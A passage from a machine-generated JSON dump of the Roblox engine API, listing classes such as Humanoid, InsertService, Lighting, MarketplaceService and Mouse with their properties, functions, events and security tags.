tive","Type":"bool"}],"Name":"GettingUp","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"health","Type":"float"}],"Name":"HealthChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Jumping","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"reached","Type":"bool"}],"Name":"MoveToFinished","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"PlatformStanding","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Ragdoll","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Running","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"},{"Name":"currentSeatPart","Type":"Instance"}],"Name":"Seated","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"old","Type":"HumanoidStateType"},{"Name":"new","Type":"HumanoidStateType"}],"Name":"StateChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"state","Type":"HumanoidStateType"},{"Name":"isEnabled","Type":"bool"}],"Name":"StateEnabledChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Strafing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Swimming","tags":[],"Class":"Humanoid","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"InputObject","tags":["notCreatable"]},{"ValueType":"Vector3","type":"Property","Name":"Delta","tags":[],"Class":"InputObject"},{"ValueType":"KeyCode","type":"Property","Name":"KeyCode","tags":[],"Class":"InputObject"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"InputObject"},{"ValueType":"UserInputState","type":"Property","Name":"UserInputState","tags":[],"Class":"InputObject"},{"ValueType":"UserInputType","type":"Property","Name":"UserInputType","tags":[],"Class":"InputObject"},{"Superclass":"Instance","type":"Class","Name":"InsertService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AllowInsertFreeModels","tags":[],"Class":"InsertService"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"ApproveAssetId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"ApproveAssetVersionId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null}],"Name":"Insert","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null},{"Type":"bool","Name":"user","Default":"false"}],"Name":"SetAdvancedResults","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetUrl","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetVersionUrl","Default":null}],"Name":"SetAssetVersionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"collectionUrl","Default":null}],"Name":"SetCollectionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeDecalUrl","Default":null}],"Name":"SetFreeDecalUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeModelUrl","Default":null}],"Name":"SetFreeModelUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"trustLevel","Default":null}],"Name":"SetTrustLevel","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"categoryId","Default":null}],"Name":"GetCollection","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeDecals","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeModels","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"GetLatestAssetVersionAsync","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"LoadAsset","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"LoadAssetVersion","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"loadAsset","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"InstancePacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"IntConstrainedValue","tags":[]},{"ValueType":"int","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MaxValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MinValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntConstrainedValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"IntValue","tags":[]},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"JointInstance","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"C0","tags":[],"Class":"JointInstance"},{"ValueType":"CoordinateFrame","type":"Property","Name":"C1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part0","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"part1","tags":["deprecated","hidden"],"Class":"JointInstance"},{"Superclass":"JointInstance","type":"Class","Name":"DynamicRotate","tags":[]},{"ValueType":"float","type":"Property","Name":"BaseAngle","tags":[],"Class":"DynamicRotate"},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateP","tags":[]},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateV","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Glue","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"F0","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F1","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F2","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F3","tags":[],"Class":"Glue"},{"Superclass":"JointInstance","type":"Class","Name":"ManualSurfaceJointInstance","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualGlue","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualWeld","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Motor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"Motor"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"value","Default":null}],"Name":"SetDesiredAngle","tags":[],"Class":"Motor","type":"Function"},{"Superclass":"Motor","type":"Class","Name":"Motor6D","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Rotate","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Snap","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"VelocityMotor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"Object","type":"Property","Name":"Hole","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"VelocityMotor"},{"Superclass":"JointInstance","type":"Class","Name":"Weld","tags":[]},{"Superclass":"Instance","type":"Class","Name":"JointsService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ClearJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CreateJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinInstance","Default":null}],"Name":"SetJoinAfterMoveInstance","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinTarget","Default":null}],"Name":"SetJoinAfterMoveTarget","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ShowPermissibleJoints","tags":[],"Class":"JointsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Keyframe","tags":[]},{"ValueType":"float","type":"Property","Name":"Time","tags":[],"Class":"Keyframe"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddPose","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPoses","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemovePose","tags":[],"Class":"Keyframe","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequence","tags":[]},{"ValueType":"bool","type":"Property","Name":"Loop","tags":[],"Class":"KeyframeSequence"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"KeyframeSequence"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"AddKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetKeyframes","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"RemoveKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequenceProvider","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Content","Name":"assetId","Default":null}],"Name":"GetKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"useCache","Default":null}],"Name":"GetKeyframeSequenceById","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterActiveKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"page","Default":"1"}],"Name":"GetAnimations","tags":[],"Class":"KeyframeSequenceProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Light","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Light"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Shadows","tags":[],"Class":"Light"},{"Superclass":"Light","type":"Class","Name":"PointLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"PointLight"},{"Superclass":"Light","type":"Class","Name":"SpotLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SpotLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SpotLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SpotLight"},{"Superclass":"Light","type":"Class","Name":"SurfaceLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SurfaceLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SurfaceLight"},{"Superclass":"Instance","type":"Class","Name":"Lighting","tags":["notCreatable"]},{"ValueType":"Color3","type":"Property","Name":"Ambient","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Bottom","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Top","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"FogColor","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogEnd","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogStart","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"GeographicLatitude","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"GlobalShadows","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"OutdoorAmbient","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"Outlines","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ShadowColor","tags":[],"Class":"Lighting"},{"ValueType":"string","type":"Property","Name":"TimeOfDay","tags":[],"Class":"Lighting"},{"ReturnType":"double","Arguments":[],"Name":"GetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetMoonDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMoonPhase","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSunDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"SetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"getMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"setMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"Arguments":[{"Name":"skyboxChanged","Type":"bool"}],"Name":"LightingChanged","tags":[],"Class":"Lighting","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LocalWorkspace","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"LogService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"source","Default":null}],"Name":"ExecuteScript","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetLogHistory","tags":[],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestServerOutput","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"}],"Name":"MessageOut","tags":[],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"},{"Name":"timestamp","Type":"int"}],"Name":"ServerMessageOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LoginService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"Logout","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PromptLogin","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"Arguments":[{"Name":"loginError","Type":"string"}],"Name":"LoginFailed","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Arguments":[{"Name":"username","Type":"string"}],"Name":"LoginSucceeded","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LuaSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreScriptStartsReported","tags":[],"Class":"LuaSettings"},{"ValueType":"double","type":"Property","Name":"DefaultWaitTime","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcFrequency","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcLimit","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcPause","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcStepMul","tags":[],"Class":"LuaSettings"},{"ValueType":"float","type":"Property","Name":"WaitingThreadsBudget","tags":[],"Class":"LuaSettings"},{"Superclass":"Instance","type":"Class","Name":"LuaSourceContainer","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"BaseScript","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"BaseScript"},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"BaseScript"},{"Superclass":"BaseScript","type":"Class","Name":"CoreScript","tags":["notCreatable"]},{"Superclass":"BaseScript","type":"Class","Name":"Script","tags":[]},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"Script"},{"ReturnType":"string","Arguments":[],"Name":"GetHash","tags":["RobloxPlaceSecurity"],"Class":"Script","type":"Function"},{"Superclass":"Script","type":"Class","Name":"LocalScript","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"ModuleScript","tags":[]},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"ModuleScript"},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"ModuleScript"},{"Superclass":"Instance","type":"Class","Name":"LuaWebService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"MarketplaceService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptNativePurchase","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptProductPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptThirdPartyPurchase","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetId","Default":null},{"Type":"int","Name":"robuxAmount","Default":null}],"Name":"ReportAssetSale","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportRobuxUpsellStarted","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"ticket","Default":null},{"Type":"int","Name":"playerId","Default":null},{"Type":"int","Name":"productId","Default":null}],"Name":"SignalClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptProductPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SignalServerLuaDialogClosed","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeveloperProductsAsync","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"InfoType","Name":"infoType","Default":"Asset"}],"Name":"GetProductInfo","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null}],"Name":"PlayerOwnsAsset","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"ClientLuaDialogRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"ticket","Type":"string"},{"Name":"playerId","Type":"int"},{"Name":"productId","Type":"int"}],"Name":"ClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"NativePurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"productId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptProductPurchaseFinished","tags":["deprecated"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptProductPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptPurchaseFinished","tags":[],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"serverResponseTable","Type":"Dictionary"}],"Name":"ServerPurchaseVerification","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"receipt","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"ThirdPartyPurchaseFinished","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Event"},{"ReturnType":"ProductPurchaseDecision","Arguments":[{"Name":"receiptInfo","Type":"Dictionary"}],"Name":"ProcessReceipt","tags":[],"Class":"MarketplaceService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"Message","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"Message"},{"Superclass":"Message","type":"Class","Name":"Hint","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Mouse","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Hit","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Content","type":"Property","Name":"Icon","tags":[],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Origin","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"Target","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"TargetFilter","tags":[],"Class":"Mouse"},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Ray","type":"Property","Name":"UnitRay","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeX","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeY","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"X","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"Y","tags":["readonly"],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"hit","tags":["deprecated","hidden","readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"target","tags":["deprecated","readonly"],"Class":"Mouse"},{"Arguments":[],"Name":"Button1Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button1Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Idle","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyUp","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Move","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelBackward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelForward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"keyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Superclass":"Mouse","type":"Class","Name":"PlayerMouse","tags":[]},{"Superclass":"Mouse","type":"Class","Name":"PluginMouse","tags":[]},{"Arguments":[{"Name":"instances","Type":"Objects"}],"Name":"DragEnter","tags":["PluginSecurity"],"Class":"PluginMouse","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkMarker","tags":["notbrowsable"]},{"Arguments":[],"Name":"Received","tags":[],"Class":"NetworkMarker","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkPeer","tags":["notbrowsable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"limit","Default":null}],"Name":"SetOutgoingKBPSLimit","tags":["PluginSecurity"],"Class":"NetworkPeer","type":"Function"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkClient","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Ticket","tags":[],"Class":"NetworkClient"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"3000"}],"Name":"Disconnect","tags":["LocalUserSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"string","Name":"server","Default":null},{"Type":"int","Name":"serverPort","Default":null},{"Type":"int","Name":"clientPort","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"30"}],"Name":"PlayerConnect","tags":["PluginSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":